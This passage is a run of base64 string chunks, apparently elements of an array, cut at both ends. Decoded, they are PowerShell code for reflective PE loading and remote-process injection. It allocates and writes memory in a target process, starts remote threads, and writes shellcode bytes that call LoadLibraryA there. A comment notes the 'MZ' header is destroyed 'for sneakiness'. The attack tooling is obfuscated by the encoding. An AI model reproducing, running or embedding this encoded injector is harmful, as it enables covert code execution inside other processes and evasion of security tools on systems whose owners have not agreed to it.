Jyb3Jjb2RlOiAkRXJyb3JDb2RlIiAgICN0b2RvIG5lZWQgdG8gZGV0ZWN0IGlmIGFscmVhZHkgc2V0CgkJfQoJCQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRUb2tlblByaXZpbGVnZXNNZW0pCgl9CgkKCQoJRnVuY3Rpb24gQ3JlYXRlLVJlbW90ZVRocmVhZAoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludFB0cl0KCQkkUHJvY2Vzc0hhbmRsZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtJbnRQdHJdCgkJJFN0YXJ0QWRkcmVzcywKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJGZhbHNlKV0KCQlbSW50UHRyXQoJCSRBcmd1bWVudFB0ciA9IFtJbnRQdHJdOjpaZXJvLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFdpbjMyRnVuY3Rpb25zCgkJKQoJCQoJCVtJbnRQdHJdJFJlbW90ZVRocmVhZEhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCgkJCgkJJE9TVmVyc2lvbiA9IFtFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi5WZXJzaW9uCgkJI1Zpc3RhIGFuZCBXaW43CgkJaWYgKCgkT1NWZXJzaW9uIC1nZSAoTmV3LU9iamVjdCAnVmVyc2lvbicgNiwwKSkgLWFuZCAoJE9TVmVyc2lvbiAtbHQgKE5ldy1PYmplY3QgJ1ZlcnNpb24nIDYsMikpKQoJCXsKCQkJI1dyaXRlLVZlcmJvc2UgIldpbmRvd3MgVmlzdGEvNyBkZXRlY3RlZCwgdXNpbmcgTnRDcmVhdGVUaHJlYWRFeC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiCgkJCSRSZXRWYWw9ICRXaW4zMkZ1bmN0aW9ucy5OdENyZWF0ZVRocmVhZEV4Lkludm9rZShbUmVmXSRSZW1vdGVUaHJlYWRIYW5kbGUsIDB4MUZGRkZGLCBbSW50UHRyXTo6WmVybywgJFByb2Nlc3NIYW5kbGUsICRTdGFydEFkZHJlc3MsICRBcmd1bWVudFB0ciwgJGZhbHNlLCAwLCAweGZmZmYsIDB4ZmZmZiwgW0ludFB0cl06Olplcm8pCgkJCSRMYXN0RXJyb3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgkJCWlmICgkUmVtb3RlVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQkJewoJCQkJVGhyb3cgIkVycm9yIGluIE50Q3JlYXRlVGhyZWFkRXguIFJldHVybiB2YWx1ZTogJFJldFZhbC4gTGFzdEVycm9yOiAkTGFzdEVycm9yIgoJCQl9CgkJfQoJCSNYUC9XaW44CgkJZWxzZQoJCXsKCQkJI1dyaXRlLVZlcmJvc2UgIldpbmRvd3MgWFAvOCBkZXRlY3RlZCwgdXNpbmcgQ3JlYXRlUmVtb3RlVGhyZWFkLiBBZGRyZXNzIG9mIHRocmVhZDogJFN0YXJ0QWRkcmVzcyIKCQkJJFJlbW90ZVRocmVhZEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5DcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRQcm9jZXNzSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0weEZGRkYsICRTdGFydEFkZHJlc3MsICRBcmd1bWVudFB0ciwgMCwgW0ludFB0cl06Olplcm8pCgkJfQoJCQoJCWlmICgkUmVtb3RlVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCQl7CgkJCVdyaXRlLUVycm9yICJFcnJvciBjcmVhdGluZyByZW1vdGUgdGhyZWFkLCB0aHJlYWQgaGFuZGxlIGlzIG51bGwiIC1FcnJvckFjdGlvbiBTdG9wCgkJfQoJCQoJCXJldHVybiAkUmVtb3RlVGhyZWFkSGFuZGxlCgl9CgoJCgoJRnVuY3Rpb24gR2V0LUltYWdlTnRIZWFkZXJzCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50UHRyXQoJCSRQRUhhbmRsZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzCgkJKQoJCQoJCSROdEhlYWRlcnNJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CgkJCgkJI05vcm1hbGx5IHdvdWxkIHZhbGlkYXRlIERPU0hlYWRlciBoZXJlLCBidXQgd2UgZGlkIGl0IGJlZm9yZSB0aGlzIGZ1bmN0aW9uIHdhcyBjYWxsZWQgYW5kIHRoZW4gZGVzdHJveWVkICdNWicgZm9yIHNuZWFraW5lc3MKCQkkZG9zSGVhZGVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFBFSGFuZGxlLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9ET1NfSEVBREVSKQoKCQkjR2V0IElNQUdFX05UX0hFQURFUlMKCQlbSW50UHRyXSROdEhlYWRlcnNQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUhhbmRsZSkgKFtJbnQ2NF1bVUludDY0XSRkb3NIZWFkZXIuZV9sZmFuZXcpKQoJCSROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRIZWFkZXJzUHRyIC1WYWx1ZSAkTnRIZWFkZXJzUHRyCgkJJGltYWdlTnRIZWFkZXJzNjQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkTnRIZWFkZXJzUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTNjQpCgkJCgkJI01ha2Ugc3VyZSB0aGUgSU1BR0VfTlRfSEVBREVSUyBjaGVja3Mgb3V0LiBJZiBpdCBkb2Vzbid0LCB0aGUgZGF0YSBzdHJ1Y3R1cmUgaXMgaW52YWxpZC4gVGhpcyBzaG91bGQgbmV2ZXIgaGFwcGVuLgoJICAgIGlmICgkaW1hZ2VOdEhlYWRlcnM2NC5TaWduYXR1cmUgLW5lIDB4MDAwMDQ1NTApCgkgICAgewoJICAgICAgICB0aHJvdyAiSW52YWxpZCBJTUFHRV9OVF9IRUFERVIgc2lnbmF0dXJlLiIKCSAgICB9CgkJCgkJaWYgKCRpbWFnZU50SGVhZGVyczY0Lk9wdGlvbmFsSGVhZGVyLk1hZ2ljIC1lcSAnSU1BR0VfTlRfT1BUSU9OQUxfSERSNjRfTUFHSUMnKQoJCXsKCQkJJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAkaW1hZ2VOdEhlYWRlcnM2NAoJCQkkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFNjRCaXQgLVZhbHVlICR0cnVlCgkJfQoJCWVsc2UKCQl7CgkJCSRJbWFnZU50SGVhZGVyczMyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE50SGVhZGVyc1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzMyKQoJCQkkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlMgLVZhbHVlICRpbWFnZU50SGVhZGVyczMyCgkJCSROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEU2NEJpdCAtVmFsdWUgJGZhbHNlCgkJfQoJCQoJCXJldHVybiAkTnRIZWFkZXJzSW5mbwoJfQoKCgkj",
		"VGhpcyBmdW5jdGlvbiB3aWxsIGdldCB0aGUgaW5mb3JtYXRpb24gbmVlZGVkIHRvIGFsbG9jYXRlZCBzcGFjZSBpbiBtZW1vcnkgZm9yIHRoZSBQRQoJRnVuY3Rpb24gR2V0LVBFQmFzaWNJbmZvCgl7CgkJUGFyYW0oCgkJW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSApXQoJCVtCeXRlW11dCgkJJFBFQnl0ZXMsCgkJCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbU3lzdGVtLk9iamVjdF0KCQkkV2luMzJUeXBlcwoJCSkKCQkKCQkkUEVJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CgkJCgkJI1dyaXRlIHRoZSBQRSB0byBtZW1vcnkgdGVtcG9yYXJpbHkgc28gSSBjYW4gZ2V0IGluZm9ybWF0aW9uIGZyb20gaXQuIFRoaXMgaXMgbm90IGl0J3MgZmluYWwgcmVzdGluZyBzcG90LgoJCVtJbnRQdHJdJFVubWFuYWdlZFBFQnl0ZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFBFQnl0ZXMuTGVuZ3RoKQoJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBFQnl0ZXMsIDAsICRVbm1hbmFnZWRQRUJ5dGVzLCAkUEVCeXRlcy5MZW5ndGgpIHwgT3V0LU51bGwKCQkKCQkjR2V0IE50SGVhZGVyc0luZm8KCQkkTnRIZWFkZXJzSW5mbyA9IEdldC1JbWFnZU50SGVhZGVycyAtUEVIYW5kbGUgJFVubWFuYWdlZFBFQnl0ZXMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKCQkKCQkjQnVpbGQgYSBzdHJ1Y3R1cmUgd2l0aCB0aGUgaW5mb3JtYXRpb24gd2hpY2ggd2lsbCBiZSBuZWVkZWQgZm9yIGFsbG9jYXRpbmcgbWVtb3J5IGFuZCB3cml0aW5nIHRoZSBQRSB0byBtZW1vcnkKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1BFNjRCaXQnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCkKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ09yaWdpbmFsSW1hZ2VCYXNlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1hZ2VCYXNlKQoJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnU2l6ZU9mSW1hZ2UnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZJbWFnZSkKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkhlYWRlcnMnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZIZWFkZXJzKQoJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnRGxsQ2hhcmFjdGVyaXN0aWNzJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRGxsQ2hhcmFjdGVyaXN0aWNzKQoJCQoJCSNGcmVlIHRoZSBtZW1vcnkgYWxsb2NhdGVkIGFib3ZlLCB0aGlzIGlzbid0IHdoZXJlIHdlIGFsbG9jYXRlIHRoZSBQRSB0byBtZW1vcnkKCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVW5tYW5hZ2VkUEVCeXRlcykKCQkKCQlyZXR1cm4gJFBFSW5mbwoJfQoKCgkjUEVJbmZvIG11c3QgY29udGFpbiB0aGUgZm9sbG93aW5nIE5vdGVQcm9wZXJ0aWVzOgoJIwlQRUhhbmRsZTogQW4gSW50UHRyIHRvIHRoZSBhZGRyZXNzIHRoZSBQRSBpcyBsb2FkZWQgdG8gaW4gbWVtb3J5CglGdW5jdGlvbiBHZXQtUEVEZXRhaWxlZEluZm8KCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KCQlbSW50UHRyXQoJCSRQRUhhbmRsZSwKCQkKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtTeXN0ZW0uT2JqZWN0XQoJCSRXaW4zMlR5cGVzLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW1N5c3RlbS5PYmplY3RdCgkJJFdpbjMyQ29uc3RhbnRzCgkJKQoJCQoJCWlmICgkUEVIYW5kbGUgLWVxICRudWxsIC1vciAkUEVIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJdGhyb3cgJ1BFSGFuZGxlIGlzIG51bGwgb3IgSW50UHRyLlplcm8nCgkJfQoJCQoJCSRQRUluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3QKCQkKCQkjR2V0IE50SGVhZGVycyBpbmZvcm1hdGlvbgoJCSROdEhlYWRlcnNJbmZvID0gR2V0LUltYWdlTnRIZWFkZXJzIC1QRUhhbmRsZSAkUEVIYW5kbGUgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKCQkKCQkjQnVpbGQgdGhlIFBFSW5mbyBvYmplY3QKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEVIYW5kbGUgLVZhbHVlICRQRUhhbmRsZQoJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUykKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRIZWFkZXJzUHRyIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uTnRIZWFkZXJzUHRyKQoJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRTY0Qml0IC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCkKCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkltYWdlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UpCgkJCgkJaWYgKCRQRUluZm8uUEU2NEJpdCAtZXEgJHRydWUpCgkJewoJCQlbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLk50SGVhZGVyc1B0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTNjQpKSkKCQkJJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNlY3Rpb25IZWFkZXJQdHIgLVZhbHVlICRTZWN0aW9uSGVhZGVyUHRyCgkJfQoJCWVsc2UKCQl7CgkJCVtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uTnRIZWFkZXJzUHRyKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX05UX0hFQURFUlMzMikpKQoJCQkkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgU2VjdGlvbkhlYWRlclB0ciAtVmFsdWUgJFNlY3Rpb25IZWFkZXJQdHIKCQl9CgkJCgkJaWYgKCgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkgLWVxICRXaW4zMkNvbnN0YW50cy5JTUFHRV9GSUxFX0RMTCkKCQl7CgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGaWxlVHlwZSAtVmFsdWUgJ0RMTCcKCQl9CgkJZWxzZWlmICgoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfRklMRV9FWEVDVVRBQkxFX0lNQUdFKSAtZXEgJFdpbjMyQ29uc3RhbnRzLklNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSkKCQl7CgkJCSRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBGaWxlVHlwZSAtVmFsdWUgJ0VYRScKCQl9CgkJZWxzZQoJCXsKCQkJVGhyb3cgIlBFIGZpbGUgaXMgbm90IGFuIEVYRSBvciBETEwiCgkJfQoJCQoJCXJldHVybiAkUEVJbmZvCgl9CgkKCQoJRnVuY3Rpb24gSW1wb3J0LURsbEluUmVtb3RlUHJvY2VzcwoJewoJCVBhcmFtKAoJCVtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KCQlbSW50UHRyXQoJCSRSZW1vdGVQcm9jSGFuZGxlLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb249MSwgTWFuZGF0b3J5PSR0cnVlKV0KCQlbSW50UHRyXQoJCSRJbXBvcnREbGxQYXRoUHRyCgkJKQoJCQoJCSRQdHJTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKQoJCQoJCSRJbXBvcnREbGxQYXRoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRJbXBvcnREbGxQYXRoUHRyKQoJCSREbGxQYXRoU2l6ZSA9IFtVSW50UHRyXVtVSW50NjRdKFtVSW50NjRdJEltcG9ydERsbFBhdGguTGVuZ3RoICsgMSkKCQkkUkltcG9ydERsbFBhdGhQdHIgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywgJERsbFBhdGhTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCWlmICgkUkltcG9ydERsbFBhdGhQdHIgLWVxIFtJbnRQdHJdOjpaZXJvKQoJCXsKCQkJVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBtZW1vcnkgaW4gdGhlIHJlbW90ZSBwcm9jZXNzIgoJCX0KCgkJW1VJbnRQdHJdJE51bUJ5dGVzV3JpdHRlbiA9IFtVSW50UHRyXTo6WmVybwoJCSRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLldyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsICRSSW1wb3J0RGxsUGF0aFB0ciwgJEltcG9ydERsbFBhdGhQdHIsICREbGxQYXRoU2l6ZSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQoJCQoJCWlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQoJCXsKCQkJVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBETEwgcGF0aCB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkiCgkJfQoJCWlmICgkRGxsUGF0aFNpemUgLW5lICROdW1CeXRlc1dyaXR0ZW4pCgkJewoJCQlUaHJvdyAiRGlkbid0IHdyaXRlIHRoZSBleHBlY3RlZCBhbW91bnQgb2YgYnl0ZXMgd2hlbiB3cml0aW5nIGEgRExMIHBhdGggdG8gbG9hZCB0byB0aGUgcmVtb3RlIHByb2Nlc3MiCgkJfQoJCQoJCSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJrZXJuZWwzMi5kbGwiKQoJCSRMb2FkTGlicmFyeUFBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsMzJIYW5kbGUsICJMb2FkTGlicmFyeUEiKSAjS2VybmVsMzIgbG9hZGVkIHRvIHRoZSBzYW1lIGFkZHJlc3MgZm9yIGFsbCBwcm9jZXNzZXMKCQkKCQlbSW50UHRyXSREbGxBZGRyZXNzID0gW0ludFB0cl06Olplcm8KCQkjRm9yIDY0Yml0IERMTCdzLCB3ZSBjYW4ndCB1c2UganVzdCBDcmVhdGVSZW1vdGVUaHJlYWQgdG8gY2FsbCBMb2FkTGlicmFyeSBiZWNhdXNlIEdldEV4aXRDb2RlVGhyZWFkIHdpbGwgb25seSBnaXZlIGJhY2sgYSAzMmJpdCB2YWx1ZSwgYnV0IHdlIG5lZWQgYSA2NGJpdCBhZGRyZXNzCgkJIwlJbnN0ZWFkLCB3cml0ZSBzaGVsbGNvZGUgd2hpbGUgY2FsbHMgTG9hZExpYnJhcnkgYW5kIHdyaXRlcyB0aGUgcmVzdWx0IHRvIGEgbWVtb3J5IGFkZHJlc3Mgd2Ugc3BlY2lmeS4gVGhlbiByZWFkIGZyb20gdGhhdCBtZW1vcnkgb25jZSB0aGUgdGhyZWFkIGZpbmlzaGVzLgoJCWlmICgkUEVJbmZvLlBFNjRCaXQgLWVxICR0cnVlKQoJCXsKCQkJI0FsbG9jYXRlIG1lbW9yeSBmb3IgdGhlIGFkZHJlc3MgcmV0dXJuZWQgYnkgTG9hZExpYnJhcnlBCgkJCSRMb2FkTGlicmFyeUFSZXRNZW0gPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbEFsbG9jRXguSW52b2tlKCRSZW1vdGVQcm9jSGFuZGxlLCBbSW50UHRyXTo6WmVybywg",
		"JERsbFBhdGhTaXplLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFKQoJCQlpZiAoJExvYWRMaWJyYXJ5QVJldE1lbSAtZXEgW0ludFB0cl06Olplcm8pCgkJCXsKCQkJCVRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBmb3IgdGhlIHJldHVybiB2YWx1ZSBvZiBMb2FkTGlicmFyeUEiCgkJCX0KCQkJCgkJCQoJCQkjV3JpdGUgU2hlbGxjb2RlIHRvIHRoZSByZW1vdGUgcHJvY2VzcyB3aGljaCB3aWxsIGNhbGwgTG9hZExpYnJhcnlBIChTaGVsbGNvZGU6IExvYWRMaWJyYXJ5QS5hc20pCgkJCSRMb2FkTGlicmFyeVNDMSA9IEAoMHg1MywgMHg0OCwgMHg4OSwgMHhlMywgMHg0OCwgMHg4MywgMHhlYywgMHgyMCwgMHg2NiwgMHg4MywgMHhlNCwgMHhjMCwgMHg0OCwgMHhiOSkKCQkJJExvYWRMaWJyYXJ5U0MyID0gQCgweDQ4LCAweGJhKQoJCQkkTG9hZExpYnJhcnlTQzMgPSBAKDB4ZmYsIDB4ZDIsIDB4NDgsIDB4YmEpCgkJCSRMb2FkTGlicmFyeVNDNCA9IEAoMHg0OCwgMHg4OSwgMHgwMiwgMHg0OCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKCQkJCgkJCSRTQ0xlbmd0aCA9ICRMb2FkTGlicmFyeVNDMS5MZW5ndGggKyAkTG9hZExpYnJhcnlTQzIuTGVuZ3RoICsgJExvYWRMaWJyYXJ5U0MzLkxlbmd0aCArICRMb2FkTGlicmFyeVNDNC5MZW5ndGggKyAoJFB0clNpemUgKiAzKQoJCQkkU0NQU01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU0NMZW5ndGgpCgkJCSRTQ1BTTWVtT3JpZ2luYWwgPSAkU0NQU01lbQoJCQkKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0MxIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCgkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDMS5MZW5ndGgpCgkJCVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRSSW1wb3J0RGxsUGF0aFB0ciwgJFNDUFNNZW0sICRmYWxzZSkKCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCgkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDMiAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzIuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTG9hZExpYnJhcnlBQWRkciwgJFNDUFNNZW0sICRmYWxzZSkKCQkJJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCgkJCVdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRMb2FkTGlicmFyeVNDMyAtTWVtb3J5QWRkcmVzcyAkU0NQU01lbQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkTG9hZExpYnJhcnlTQzMuTGVuZ3RoKQoJCQlbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTG9hZExpYnJhcnlBUmV0TWVtLCAkU0NQU01lbSwgJGZhbHNlKQoJCQkkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkUHRyU2l6ZSkKCQkJV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJExvYWRMaWJyYXJ5U0M0IC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCgkJCSRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRMb2FkTGlicmFyeVNDNC5MZW5